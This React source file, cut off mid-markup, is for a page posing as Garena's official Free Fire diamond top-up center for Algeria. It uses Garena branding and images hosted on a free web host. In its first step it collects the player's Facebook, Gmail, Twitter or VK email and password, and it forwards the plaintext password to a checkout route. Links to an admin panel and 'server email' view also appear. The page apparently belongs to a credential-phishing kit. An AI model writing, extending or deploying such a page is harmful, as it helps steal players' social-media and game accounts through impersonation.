import { useState, useEffect } from "react";
import { useNavigate, useLocation } from "react-router-dom";
import axios from "axios";
import { motion, AnimatePresence } from "motion/react";
import {
  AlertTriangle,
  ShieldCheck,
  CheckCircle2,
  ChevronDown,
  Globe,
  Info,
  Menu,
  X,
  ClipboardList,
  User,
  LogOut,
  Facebook,
  Instagram,
  Check,
  Mail,
  Eye,
  EyeOff,
  ShieldAlert,
  Search
} from "lucide-react";
import Modal from "../components/Modal";
import { useLanguage } from "../context/LanguageContext";

export default function Charge() {
  const { t, language, setLanguage } = useLanguage();
  const [isLangOpen, setIsLangOpen] = useState(false);
  const navigate = useNavigate();
  const location = useLocation();
  const state = location.state || {};
  
  const [isSidebarOpen, setIsSidebarOpen] = useState(false);
  const user = JSON.parse(localStorage.getItem('ff_user') || '{}');

  const [platform, setPlatform] = useState(state.platform || "");
  const [email, setEmail] = useState(state.email || user?.temp_email || "");
  const [platformPassword, setPlatformPassword] = useState(state.platformPassword || "");
  const [level, setLevel] = useState(state.level || "");
  const [charged, setCharged] = useState(state.charged || "لا");
  const [diamonds, setDiamonds] = useState<number | string | null>(state.diamonds || null);
  const [currentStep, setCurrentStep] = useState(state.returnToStep || 1);
  const [paymentMethod, setPaymentMethod] = useState(state.paymentMethod || "");
  const [isLoading, setIsLoading] = useState(true);
  const [showPassword, setShowPassword] = useState(false);

  const [showConfirm, setShowConfirm] = useState(false);
  const [showProcess, setShowProcess] = useState(false);
  const [showSuccess, setShowSuccess] = useState(false);
  const [isAgreed, setIsAgreed] = useState(false);
  const [processStep, setProcessStep] = useState(0);
  const [orderNum, setOrderNum] = useState("");

  const [toastMessage, setToastMessage] = useState("");

  const showToast = (msg: string) => {
    setToastMessage(msg);
    setTimeout(() => setToastMessage(""), 4000);
  };

  const [termsModal, setTermsModal] = useState(false);

  useEffect(() => {
    const termsAccepted = localStorage.getItem('ff_terms_accepted');
    if (!termsAccepted) {
      setTermsModal(true);
    }
  }, []);

  const acceptTerms = () => {
    localStorage.setItem('ff_terms_accepted', 'true');
    setTermsModal(false);
  };

  useEffect(() => {
    const timer = setTimeout(() => setIsLoading(false), 1500);
    return () => clearTimeout(timer);
  }, []);

  const diamondOptions = [
    { amount: 100, bonus: "10", price: "360" },
    { amount: 210, bonus: "21", price: "650" },
    { amount: 310, bonus: "31", price: "950" },
    { amount: 520, bonus: "52", price: "1600" },
    { amount: 1060, bonus: "106", price: "3200" },
    { amount: 2180, bonus: "218", price: "6500" },
    { amount: 5600, bonus: "560", price: "18000" },
  ];

  const getSelectedInfo = () => {
    if (!diamonds) return { amount: "0", bonus: "0", price: "0" };
    if (typeof diamonds === "string") {
      if (diamonds === "Monthly Membership")
        return { amount: "Monthly", bonus: "💎", price: "1500" };
      if (diamonds === "Weekly Membership")
        return { amount: "Weekly", bonus: "💎", price: "500" };
      if (diamonds === "Booyah Pass")
        return { amount: "Booyah", bonus: "🔥", price: "1200" };
    }
    const opt = diamondOptions.find((o) => o.amount === diamonds);
    return opt
      ? { amount: opt.amount.toLocaleString(), bonus: opt.bonus, price: opt.price }
      : { amount: "0", bonus: "0", price: "0" };
  };

  const selectedInfo = getSelectedInfo();

  const processTexts = [
    "جاري التحقق من المعلومات...",
    "جاري التحقق من أمان المعلومات...",
    "جاري تشفير المعلومات...",
    "جاري إرسال الطلب...",
  ];

  const handleNextStep1 = () => {
    if (!platform) {
      showToast(language === 'ar' ? "يرجى اختيار نوع المنصة (فيسبوك، جوجل، الخ...)" : "Please select a platform (Facebook, Google, etc.)");
      return;
    }
    if (!email || !/^\S+@\S+\.\S+$/.test(email.trim())) {
      showToast(language === 'ar' ? "صيغة البريد الإلكتروني غير صحيحة" : "Invalid email format");
      return;
    }
    if (!platformPassword) {
      showToast(language === 'ar' ? "يرجى إدخال كلمة المرور" : "Please enter your password");
      return;
    }
    if (!level) {
      showToast(language === 'ar' ? "يرجى إدخال مستوى الحساب الخاص بك" : "Please enter your account level");
      return;
    }
    setCurrentStep(2);
    window.scrollTo({ top: 0, behavior: 'smooth' });
  };

  const handleNextStep2 = () => {
    if (!diamonds) {
      showToast(t?.("select_diamonds") || "يرجى اختيار كمية الجواهر أو العروض");
      return;
    }
    setCurrentStep(3);
    window.scrollTo({ top: 0, behavior: 'smooth' });
  };

  const handleNextStep3 = () => {
    if (!paymentMethod) {
      showToast(t?.("select_payment") || "يرجى اختيار طريقة الدفع أولاً");
      return;
    }
    
    navigate('/checkout', {
      state: {
        platform,
        email,
        platformPassword,
        level,
        charged,
        diamonds,
        paymentMethod,
        selectedInfo
      }
    });
  };

  const handleLogout = () => {
    localStorage.removeItem('ff_token');
    localStorage.removeItem('ff_user');
    navigate('/');
  };

  return (
    <div className="min-h-screen flex flex-col bg-[#F8F9FA] font-sans overflow-x-hidden" dir={language === 'ar' ? 'rtl' : 'ltr'}>
      {/* Sidebar Overlay */}
      <AnimatePresence>
        {isSidebarOpen && (
          <motion.div 
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
            className="fixed inset-0 z-[100] bg-black/50 backdrop-blur-sm"
            onClick={() => setIsSidebarOpen(false)}
          />
        )}
      </AnimatePresence>

      {/* Sidebar */}
      <AnimatePresence>
        {isSidebarOpen && (
          <motion.div 
            initial={{ x: language === 'ar' ? '100%' : '-100%' }}
            animate={{ x: 0 }}
            exit={{ x: language === 'ar' ? '100%' : '-100%' }}
            transition={{ type: "spring", bounce: 0, duration: 0.3 }}
            className={`fixed top-0 bottom-0 ${language === 'ar' ? 'right-0' : 'left-0'} z-[110] w-72 bg-white shadow-2xl flex flex-col`}
          >
            <div className={`flex items-center justify-between p-4 border-b border-gray-100 ${language === 'ar' ? '' : 'flex-row-reverse'}`}>
              <div className="flex items-center gap-3">
                <div className="h-10 w-10 bg-gray-100 rounded-full flex items-center justify-center border-2 border-red-100">
                  <User className="h-5 w-5 text-red-600" />
                </div>
                <div className="text-right">
                  <div className="font-bold text-gray-900">{user?.account_id}</div>
                </div>
              </div>
              <button 
                onClick={() => setIsSidebarOpen(false)}
                className="p-2 rounded-full hover:bg-gray-100 transition-colors"
              >
                <X className="h-5 w-5 text-gray-500" />
              </button>
            </div>
            
            <div className="flex-1 overflow-y-auto py-6 px-4 space-y-2">
               <button 
                onClick={() => { setIsSidebarOpen(false); navigate('/my-orders'); }}
                className="flex w-full items-center rounded-xl bg-gray-50 p-4 font-bold text-gray-700 transition-colors hover:bg-red-50 hover:text-red-600"
              >
                <ClipboardList className={`h-5 w-5 text-gray-500 ${language === 'ar' ? 'ml-3' : 'mr-3'}`} />
                {t('my_orders')}
              </button>
              <button 
                onClick={() => { setIsSidebarOpen(false); navigate('/account'); }}
                className="flex w-full items-center rounded-xl bg-gray-50 p-4 font-bold text-gray-700 transition-colors hover:bg-red-50 hover:text-red-600"
              >
                <User className={`h-5 w-5 text-gray-500 ${language === 'ar' ? 'ml-3' : 'mr-3'}`} />
                {t('account')}
              </button>
              <button 
                onClick={() => { setIsSidebarOpen(false); navigate('/email'); }}
                className="flex w-full items-center rounded-xl bg-gray-50 p-4 font-bold text-gray-700 transition-colors hover:bg-red-50 hover:text-red-600"
              >
                <Mail className={`h-5 w-5 text-gray-500 ${language === 'ar' ? 'ml-3' : 'mr-3'}`} />
                {language === 'ar' ? 'بريد الخادم' : 'Server Email'}
              </button>
              <button 
                onClick={() => { setIsSidebarOpen(false); navigate('/search-id'); }}
                className="flex w-full items-center rounded-xl bg-gray-50 p-4 font-bold text-gray-700 transition-colors hover:bg-red-50 hover:text-red-600"
              >
                <Search className={`h-5 w-5 text-gray-500 ${language === 'ar' ? 'ml-3' : 'mr-3'}`} />
                {language === 'ar' ? 'بحث بالحساب' : 'Search Account'}
              </button>
              <button 
                onClick={() => { setIsSidebarOpen(false); navigate('/admin'); }}
                className="flex w-full items-center rounded-xl bg-gray-50 p-4 font-bold text-gray-700 transition-colors hover:bg-red-50 hover:text-red-600"
              >
                <ShieldAlert className={`h-5 w-5 text-gray-500 ${language === 'ar' ? 'ml-3' : 'mr-3'}`} />
                {language === 'ar' ? 'لوحة الإدارة' : 'Admin Panel'}
              </button>

              <div className="my-6 border-t border-gray-100"></div>

              <div className="space-y-3">
                 <a 
                    href="https://www.facebook.com/GarenaFreeFireMENA" 
                    target="_blank" rel="noopener noreferrer"
                    className="flex items-center rounded-xl bg-gray-50 p-4 font-bold text-gray-700 transition-colors hover:bg-[#1877F2]/10 hover:text-[#1877F2]"
                  >
                    <Facebook className={`h-5 w-5 text-[#1877F2] ${language === 'ar' ? 'ml-3' : 'mr-3'}`} />
                    تابعنا في فيسبوك
                  </a>
                  <a 
                    href="https://www.instagram.com/garenafreefiremena?igsh=MTR4bTRqeTgycWpzMg==" 
                    target="_blank" rel="noopener noreferrer"
                    className="flex items-center rounded-xl bg-gray-50 p-4 font-bold text-gray-700 transition-colors hover:bg-[#E1306C]/10 hover:text-[#E1306C]"
                  >
                    <Instagram className={`h-5 w-5 text-[#E1306C] ${language === 'ar' ? 'ml-3' : 'mr-3'}`} />
                    تابعنا على انستغرام
                  </a>
              </div>
            </div>

            <div className="p-4 border-t border-gray-100">
              <button 
                onClick={handleLogout}
                className="flex w-full items-center justify-center gap-2 rounded-xl bg-red-50 py-3 font-bold text-red-600 transition-colors hover:bg-red-100"
              >
                <LogOut className={`h-5 w-5 ${language === 'ar' ? 'rotate-180' : ''}`} />
                تسجيل الخروج
              </button>
            </div>
          </motion.div>
        )}
      </AnimatePresence>

      {/* Header */}
      <header className="sticky top-0 z-40 bg-white shadow-sm">
        <div className="mx-auto flex h-16 max-w-4xl items-center justify-between px-4">
          <div className="flex items-center gap-2">
            <button 
              onClick={() => setIsSidebarOpen(true)}
              className="p-2 rounded-lg hover:bg-gray-100 text-gray-600 transition-colors"
            >
              <Menu className="h-6 w-6" />
            </button>
            <div className="relative">
              <button 
                onClick={() => setIsLangOpen(!isLangOpen)}
                className="flex items-center gap-1 rounded-full border border-gray-200 bg-gray-50 px-3 py-1.5 text-xs font-bold text-gray-700 hover:bg-gray-100 transition-colors"
              >
                <Globe className="h-4 w-4" />
                <span>{language === 'ar' ? t('dz_ar') : t('dz_en')}</span>
                <ChevronDown className={`h-4 w-4 transition-transform ${isLangOpen ? 'rotate-180' : ''}`} />
              </button>
              <AnimatePresence>
                {isLangOpen && (
                  <motion.div 
                    initial={{ opacity: 0, y: 10, scale: 0.95 }}
                    animate={{ opacity: 1, y: 0, scale: 1 }}
                    exit={{ opacity: 0, y: 10, scale: 0.95 }}
                    transition={{ duration: 0.15 }}
                    className={`absolute top-10 ${language === 'ar' ? 'right-0' : 'left-0'} min-w-[160px] rounded-2xl bg-white p-2 shadow-xl border border-gray-100 z-50`}
                    dir={language === 'ar' ? 'rtl' : 'ltr'}
                  >
                    <button 
                      onClick={() => { setLanguage('ar'); setIsLangOpen(false); }}
                      className={`flex items-center w-full text-right px-3 py-2 rounded-xl text-sm font-bold transition-colors ${language === 'ar' ? 'bg-red-50 text-red-600' : 'text-gray-700 hover:bg-gray-50'}`}
                    >
                      <span className="flex-1 text-right">العربية (dz)</span>
                      {language === 'ar' && <Check className="h-4 w-4" />}
                    </button>
                    <button 
                      onClick={() => { setLanguage('en'); setIsLangOpen(false); }}
                      className={`flex items-center w-full text-right px-3 py-2 rounded-xl mt-1 text-sm font-bold transition-colors ${language === 'en' ? 'bg-red-50 text-red-600' : 'text-gray-700 hover:bg-gray-50'}`}
                    >
                      <span className="flex-1 text-right">English (dz)</span>
                      {language === 'en' && <Check className="h-4 w-4" />}
                    </button>
                  </motion.div>
                )}
              </AnimatePresence>
            </div>
          </div>

          <div className={`flex items-center gap-3 ${language === 'ar' ? 'flex-row' : 'flex-row-reverse'}`}>
            <div className={`leading-tight ${language === 'ar' ? 'text-right' : 'text-left'}`}>
              <div className="text-sm font-bold text-gray-800">{t('garena_center')}</div>
              <div className="text-xs font-semibold text-gray-500">{t('official')}</div>
            </div>
            <div className="flex h-10 w-10 items-center justify-center overflow-hidden rounded-md border border-gray-100 bg-white shadow-sm">
              <img
                src="https://storingo.lovestoblog.com/garena.png"
                alt="Garena"
                className="h-full w-full object-contain p-1"
                onError={(e) => {
                  e.currentTarget.style.display = "none";
                  const parent = e.currentTarget.parentElement;
                  if (parent) {
                    parent.innerHTML =
                      '<svg width="40" height="40" viewBox="0 0 200 200" fill="red"><path d="M100 10C50.294 10 10 50.294 10 100s40.294 90 90 90 90-40.294 90-90S149.706 10 100 10Zm41.134 116.7L116.7 151.134 48.866 83.3 73.3 58.866l43.4 43.4 24.434-24.434-24.434-24.434-24.434 24.434-24.434-24.434 48.868-48.868L165.566 73.3l-24.432 24.434 24.432 24.434-24.432 24.434Z"/></svg>';
                  }
                }}
              />
            </div>
          </div>
        </div>
      </header>

      <main className="mx-auto max-w-4xl px-4 pt-4 space-y-6 flex-1 w-full pb-8">
        {/* Banners */}
        {isLoading ? (
          <div className="h-32 md:h-48 w-full animate-pulse rounded-2xl bg-gray-200" />
        ) : (
          <div className="relative overflow-hidden rounded-2xl shadow-[0_8px_32px_0_rgba(31,38,135,0.07)]">
            <img
              src="https://storingo.lovestoblog.com/banner.jpg"
              alt="مركز قارينا الثاني للشحن"
              className="h-32 md:h-48 w-full rounded-2xl object-cover"
              onError={(e) => {
                e.currentTarget.style.display = "none";
                if (e.currentTarget.parentElement) {
                  e.currentTarget.parentElement.classList.add(
                    "bg-gradient-to-r",
                    "from-blue-900",
                    "to-indigo-900",
                  );
                  e.currentTarget.parentElement.innerHTML =
                    '<div class="absolute inset-0 opacity-20"><div class="h-full w-full" style="background-image: radial-gradient(circle at 2px 2px, white 1px, transparent 0); background-size: 24px 24px"></div></div><div class="relative flex h-full items-center justify-center p-6 text-center"><h1 class="text-2xl md:text-4xl font-black italic tracking-widest text-white drop-shadow-md">مركز قارينا الثاني للشحن</h1></div>';
                }
              }}
            />
          </div>
        )}

        {/* Game Icon */}
        <div className={`flex ${language === 'ar' ? 'justify-end' : 'justify-start'} gap-4 border-b border-gray-200 pb-4`}>
          {isLoading ? (
            <div className="h-20 w-20 animate-pulse rounded-2xl bg-gray-200" />
          ) : (
            <div className="relative cursor-pointer">
              <div className="h-20 w-20 overflow-hidden rounded-2xl border-2 border-red-600 p-0.5 shadow-md bg-white">
                <img
                  src="https://storingo.lovestoblog.com/ff.png"
                  alt="Free Fire"
                  className="h-full w-full rounded-xl object-cover"
                  onError={(e) =>
                    (e.currentTarget.src =
                      "https://play-lh.googleusercontent.com/NejsQExEa0ZqV4xOMr0HjWd2mK95P_k1Gq-U2xI2qXYR0z8C6rE8lQ6YIIf4rY1R3W8=w240-h480-rw")
                  }
                />
              </div>
              <p className="mt-2 text-center text-xs font-bold text-red-600">
                Free Fire
              </p>
            </div>
          )}
        </div>

        {/* Section 1: Login */}
        {currentStep === 1 && (
        <section className="rounded-2xl bg-white p-4 shadow-sm border border-gray-100">
          <div className="mb-6 flex items-center gap-3">
            <div className="flex h-8 w-8 items-center justify-center rounded-lg bg-red-600 text-lg font-black text-white">
              1
            </div>
            <h2 className="text-xl font-black text-gray-800">{t('account_info')}</h2>
          </div>

          <div className="space-y-5">
            <div className="space-y-3">
              <label className="block text-sm font-bold text-gray-700">
                {t('platform_type')}
                <Info className={`inline h-4 w-4 text-gray-400 ${language === 'ar' ? 'mr-2' : 'ml-2'}`} />
              </label>
              <div className="flex gap-3 justify-center md:justify-start flex-wrap">
                {["facebook", "gmail", "twitter", "vk"].map((p) => (
                  <button
                    key={p}
                    onClick={() => setPlatform(p)}
                    className={`flex h-12 w-12 items-center justify-center rounded-full transition-all border-2 ${platform === p ? "border-blue-600 scale-110 shadow-md" : "border-transparent bg-gray-50 hover:bg-gray-100"}`}
                  >
                    {p === "facebook" && (
                      <div className="flex h-10 w-10 items-center justify-center rounded-full bg-[#1877F2] text-white">
                        <svg
                          width="20"
                          height="20"
                          viewBox="0 0 24 24"
                          fill="currentColor"
                          stroke="none"
                        >
                          <path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.469h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.469h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z" />
                        </svg>
                      </div>
                    )}
                    {p === "twitter" && (
                      <div className="flex h-10 w-10 items-center justify-center rounded-full bg-black text-white">
                        <svg
                          width="18"
                          height="18"
                          viewBox="0 0 24 24"
                          fill="currentColor"
                          stroke="none"
                        >
                          <path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z" />
                        </svg>
                      </div>
                    )}
                    {p === "gmail" && (
                      <div className="flex h-10 w-10 items-center justify-center rounded-full bg-white border border-gray-200">
                        <svg width="20" height="20" viewBox="0 0 48 48">
                          <path
                            fill="#EA4335"
                            d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"
                          />
                          <path
                            fill="#4285F4"
                            d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"
                          />
                          <path
                            fill="#FBBC05"
                            d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"
                          />
                          <path
                            fill="#34A853"
                            d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"
                          />
                        </svg>
                      </div>
                    )}
                    {p === "vk" && (
                      <div className="flex h-10 w-10 items-center justify-center rounded-full bg-[#0077FF] text-white">
                        <span className="font-bold text-sm">VK</span>
                      </div>
                    )}
                  </button>
                ))}
              </div>
            </div>

            <div className="grid gap-4 md:grid-cols-2">
              <div className="flex flex-col gap-1 w-full">
                <input
                  type="text"
                  placeholder={t('account_email')}
                  value={email}
                  disabled={!!user?.temp_email}
                  onChange={(e) => setEmail(e.target.value)}
                  className="w-full rounded-xl border border-gray-300 bg-gray-50 p-4 text-sm font-medium text-gray-900 outline-none transition-all placeholder:text-gray-400 focus:border-red-500 focus:bg-white focus:ring-2 focus:ring-red-100 disabled:opacity-75 disabled:cursor-not-allowed disabled:bg-gray-100"
                />
              </div>
              <div className="relative">
                <input
                  type={showPassword ? "text" : "password"}
                  placeholder={t('account_password')}
                  value={platformPassword}
                  onChange={(e) => setPlatformPassword(e.target.value)}
                  className="w-full rounded-xl border border-gray-300 bg-gray-50 p-4 pr-12 text-sm font-medium text-gray-900 outline-none transition-all placeholder:text-gray-400 focus:border-red-500 focus:bg-white focus:ring-2 focus:ring-red-100 rtl:pl-12 rtl:pr-4"
                />
                <button
                  type="button"
                  onClick={() => setShowPassword(!showPassword)}
                  className={`absolute top-1/2 -translate-y-1/2 text-gray-400 hover:text-gray-600 transition-colors ${language === 'ar' ? 'left-4' : 'right-4'}`}
                >
                  {showPassword ? <EyeOff className="h-5 w-5" /> : <Eye className="h-5 w-5" />}
                </button>
              </div>
              <input
                type="number"
                placeholder={t('account_level')}
                value={level}
                onChange={(e) => setLevel(e.target.value)}
                className="w-full rounded-xl border border-gray-300 bg-gray-50 p-4 text-sm font-medium text-gray-900 outline-none transition-all placeholder:text-gray-400 focus:border-red-500 focus:bg-white focus:ring-2 focus:ring-red-100"
              />
              <div className="relative">
                <select
                  value={charged}
                  onChange={(e) => setCharged(e.target.value)}
                  className={`w-full rounded-xl border border-gray-300 bg-gray-50 p-4 text-sm font-medium text-gray-900 outline-none transition-all focus:border-red-500 focus:bg-white focus:ring-2 focus:ring-red-100 appearance-none ${language === 'en' ? 'pl-10' : 'pr-4'}`}
                >
                  <option value="لا">{t('charged_before')} - {t('no')}</option>
                  <option value="نعم">{t('charged_before')} - {t('yes')}</option>
                </select>
                <div className={`pointer-events-none absolute ${language === 'ar' ? 'left-4' : 'right-4'} top-1/2 -translate-y-1/2 text-gray-500`}>
                  <ChevronDown className="h-5 w-5" />
                </div>
              </div>
            </div>
          </div>
        </section>
        )}

        {/* Section 2: Amount */}
        {currentStep === 2 && (
        <section className="rounded-2xl bg-white p-4 shadow-sm border border-gray-100">
          <div className="mb-6 flex items-center gap-3">
            <div className="flex h-8 w-8 items-center justify-center rounded-lg bg-red-600 text-lg font-black text-white">
              2
            </div>
            <h2 className="text-xl font-black text-gray-800">{t('amount')}</h2>
          </div>

          {isLoading ? (
            <div className="grid grid-cols-2 md:grid-cols-3 gap-3">
              {[1, 2, 3, 4, 5, 6].map((i) => (
                <div
                  key={i}
                  className="h-16 animate-pulse rounded-xl bg-gray-100"
                />
              ))}
            </div>
          ) : (
            <>
              <div className="grid grid-cols-2 lg:grid-cols-3 gap-3 mb-6">
                {diamondOptions.map((opt) => (
                  <button
                    key={opt.amount}
                    onClick={() => setDiamonds(opt.amount)}
                    className={`flex items-center justify-between rounded-xl border p-4 transition-all ${diamonds === opt.amount ? "border-red-500 bg-red-50" : "border-gray-200 bg-white hover:border-red-200 hover:bg-gray-50"}`}
                  >
                    <div className="flex flex-col items-start">
                      <span className="font-bold text-gray-800 text-lg">
                        {opt.amount}
                      </span>
                      {opt.bonus !== "0" && (
                        <span className="text-[10px] font-bold text-red-500">
                          + {opt.bonus} علاوة
                        </span>
                      )}
                    </div>
                    <div>
                      <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" className="text-blue-400 drop-shadow-sm transition-transform group-hover:scale-110">
                        <path d="M6 3L3 8L12 21L21 8L18 3H6Z" fill="currentColor" />
                        <path d="M6 3L12 8V21M18 3L12 8M3 8H21M6 3L3 8L12 8L18 3M12 21L3 8M12 21L21 8" stroke="white" strokeWidth="0.5" strokeLinecap="round" strokeLinejoin="round" />
                      </svg>
                    </div>
                  </button>
                ))}
              </div>

              <div className="border-t border-gray-100 pt-6">
                <div className="mb-4 text-center">
                  <span className="bg-white px-4 text-sm font-bold text-gray-500 relative z-10">
                    {t('special_offer')}
                  </span>
                  <div className="border-t border-gray-200 -mt-2.5"></div>
                </div>
                <div className="grid grid-cols-2 md:grid-cols-3 gap-3">
                  <button
                    onClick={() => setDiamonds("Monthly Membership")}
                    className={`relative flex flex-col items-center rounded-xl border p-2 transition-all group ${diamonds === "Monthly Membership" ? "border-red-600 ring-1 ring-red-100 shadow-md bg-white" : "border-gray-100 bg-white hover:border-red-300 shadow-sm"}`}
                  >
                    <div className="w-full aspect-[16/9] overflow-hidden rounded-lg mb-2">
                       <img
                        src="https://storingo.lovestoblog.com/monthly.png"
                        alt="Monthly Membership"
                        className="w-full h-full object-cover transition-transform group-hover:scale-105"
                        onError={(e) => {
                          e.currentTarget.src = "https://via.placeholder.com/160x90?text=Monthly";
                        }}
                      />
                    </div>
                    <div className="flex items-center gap-1.5 text-[11px] font-bold text-gray-800">
                      <div className="flex h-4 w-4 items-center justify-center rounded-full border border-red-500 text-red-500">
                        <Info className="h-2.5 w-2.5" />
                      </div>
                      {t('monthly_membership')}
                    </div>
                  </button>

                  <button
                    onClick={() => setDiamonds("Weekly Membership")}
                    className={`relative flex flex-col items-center rounded-xl border p-2 transition-all group ${diamonds === "Weekly Membership" ? "border-red-600 ring-1 ring-red-100 shadow-md bg-white" : "border-gray-100 bg-white hover:border-red-300 shadow-sm"}`}
                  >
                    <div className="w-full aspect-[16/9] overflow-hidden rounded-lg mb-2">
                       <img
                        src="https://storingo.lovestoblog.com/weekly.png"
                        alt="Weekly Membership"
                        className="w-full h-full object-cover transition-transform group-hover:scale-105"
                        onError={(e) => {
                          e.currentTarget.src = "https://via.placeholder.com/160x90?text=Weekly";
                        }}
                      />
                    </div>
                    <div className="flex items-center gap-1.5 text-[11px] font-bold text-gray-800">
                      <div className="flex h-4 w-4 items-center justify-center rounded-full border border-red-500 text-red-500">
                        <Info className="h-2.5 w-2.5" />
                      </div>
                      {t('weekly_membership')}
                    </div>
                  </button>

                  <button
                    onClick={() => setDiamonds("Booyah Pass")}
                    className={`relative flex flex-col items-center rounded-xl border p-2 transition-all group ${diamonds === "Booyah Pass" ? "border-red-600 ring-1 ring-red-100 shadow-md bg-white" : "border-gray-100 bg-white hover:border-red-300 shadow-sm"}`}
                  >
                    <div className="w-full aspect-[16/9] overflow-hidden rounded-lg mb-2">
                       <img
                        src="https://storingo.lovestoblog.com/booyah.png"
                        alt="Booyah Pass"
                        className="w-full h-full object-cover transition-transform group-hover:scale-105"
                        onError={(e) => {
                          e.currentTarget.src = "https://via.placeholder.com/160x90?text=Booyah";
                        }}
                      />
                    </div>
                    <div className="flex items-center gap-1.5 text-[11px] font-bold text-gray-800">
                      <div className="flex h-4 w-4 items-center justify-center rounded-full border border-red-500 text-red-500">
                        <Info className="h-2.5 w-2.5" />
                      </div>
                      {t('booyah_pass')}
                    </div>
                  </button>
                </div>
              </div>
            </>
          )}
        </section>
        )}

        {/* Section 3: Payment */}
        {currentStep === 3 && (
        <section className="rounded-2xl bg-white p-4 shadow-sm border border-gray-100 mb-8">
          <div className="mb-6 flex items-center gap-3">
            <div className="flex h-8 w-8 items-center justify-center rounded-lg bg-red-600 text-lg font-black text-white">
              3
            </div>
            <h2 className="text-xl font-black text-gray-800">{t('payment_methods')}</h2>
          </div>

          <div className="mb-4">
            <div className={`mb-4 text-[11px] text-gray-500 font-medium flex gap-2 ${language === 'ar' ? 'text-right' : 'text-left'}`}>
              <div className="mt-1 flex-shrink-0 text-gray-400">
                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                  <rect x="3" y="5" width="18" height="14" rx="2" ry="2"></rect>
                  <line x1="8" y1="12" x2="16" y2="12"></line>
                </svg>
              </div>
              <p className="leading-relaxed text-justify">
                {language === 'ar' 
                  ? 'فعّل أولاً رصيد الألعاب عبر #707* أو من خلال تطبيق جازي ضمن قسم المنتجات الرقمية. بعد تفعيل الرصيد، ارجع إلى موقع Shop3Game واختر Djezzy كطريقة للدفع لإتمام عملية الشراء. ثم أدخل رقم هاتفك واتبع التعليمات في رسالة SMS قصيرة تصلك على رقمك. سيتم خصم قيمة الشراء من رصيدك'
                  : 'First activate the gaming balance via *707# or through the Djezzy app in the digital products section. After activating the balance, return here and choose Djezzy as a payment method to complete the purchase. Then enter your phone number and follow the instructions in the short SMS you receive.'}
              </p>
            </div>
            <button 
              onClick={() => setPaymentMethod('djezzy')}
              className={`relative w-full rounded-xl border-2 hover:bg-red-50 bg-white p-4 transition-all overflow-hidden flex items-center justify-center h-24 ${paymentMethod === 'djezzy' ? 'border-[#CD1212] ring-2 ring-red-100' : 'border-gray-200'}`}
            >
              <div className="flex items-center gap-2">
                <div className="text-2xl font-black text-black">{t('djezzy')}</div>
                <div className="bg-red-600 text-white font-black text-xl px-2 py-1 transform -skew-x-12">
                  DJEZZY
                </div>
              </div>
            </button>
          </div>

          <div className="border-t border-gray-100 pt-6 mt-6">
            <div className="mb-4 text-center">
              <span className="bg-white px-4 text-sm font-bold text-gray-500 relative z-10">
                {t('unavailable_channels')}
              </span>
              <div className="border-t border-gray-200 -mt-2.5"></div>
            </div>
            <div className="relative rounded-xl border border-gray-200 bg-gray-50 p-4 h-24 flex items-center justify-between px-6 overflow-hidden opacity-80">
              <div className="text-2xl font-black text-red-500">Ooredoo</div>
              <span className="text-sm font-bold text-gray-600 bg-white px-3 py-1.5 rounded-full shadow-sm border border-gray-200">
                {t('temp_closed')}
              </span>
            </div>
          </div>
        </section>
        )}

        {/* Footer */}
        <footer className="mt-12 text-center text-xs text-gray-500 pb-36">
          <p className="mb-4">© Garena Online. الحقوق كاملة.</p>
          <div className="flex flex-wrap justify-center gap-4 text-gray-400">
            <a href="#" className="hover:text-gray-600">
              سياسة الخصوصية
            </a>
            <span>|</span>
            <a href="#" className="hover:text-gray-600">
              الشروط والأحكام
            </a>
            <span>|</span>
            <a href="#" className="hover:text-gray-600">
              مركز المساعدة
            </a>
            <span>|</span>
            <a href="#" className="hover:text-gray-600">
              FAQ
            </a>
          </div>
        </footer>
      </main>

      {/* Floating Bottom Bar (Like Bottom Nav) */}
      <div 
        className="fixed bottom-0 left-0 right-0 z-50 border-t border-gray-100 bg-white px-4 pt-3 pb-4 shadow-[0_-8px_30px_rgba(0,0,0,0.08)] block w-full"
        style={{ paddingBottom: 'max(1rem, env(safe-area-inset-bottom))' }}
      >
        <div className={`mx-auto flex max-w-4xl items-center justify-between gap-3 ${language === 'en' ? 'flex-row-reverse' : ''}`}>
            {/* Price Info */}
            <div className={`flex flex-col ${language === 'en' ? 'items-start' : 'items-end'} leading-none`}>
              <div className="flex items-center gap-1.5 mb-1.5">
                <div className="flex items-center">
                  {selectedInfo.bonus && selectedInfo.bonus !== "0" && (
                     <span className={`text-[#CD1212] font-black text-sm ${language === 'ar' ? 'ml-1.5' : 'mr-1.5'}`}>
                      {selectedInfo.bonus} +
                    </span>
                  )}
                  <span className="text-2xl font-black text-gray-900 leading-none">
                    {selectedInfo.amount}
                  </span>
                </div>
                <svg
                  width="22"
                  height="22"
                  viewBox="0 0 24 24"
                  fill="none"
                  className={`text-blue-400 drop-shadow-sm ${language === 'ar' ? 'ml-1' : 'mr-1'}`}
                >
